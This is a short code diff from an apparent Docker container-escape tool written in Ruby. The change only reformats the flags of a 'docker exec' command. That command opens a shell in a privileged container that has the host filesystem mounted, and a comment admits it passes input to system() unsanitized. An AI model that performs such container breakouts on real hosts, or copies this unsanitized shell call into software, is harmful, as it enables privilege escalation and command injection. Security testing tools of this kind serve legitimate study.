@@ -10,7 +10,7 @@ def unix_socket_breakout
     puts "We should have started a privileged container with the host OS filesystem mounted."
     puts "Let's try to start a shell inside that container"
     # am i really passing this input to the shell directly, you betcha
-    system(docker_loc + " exec -i -t super_legit_docker_escape /bin/sh")
+    system(docker_loc + " exec -it super_legit_docker_escape /bin/sh")
   else
     puts("Not root. Let's try to use Curl")
   end
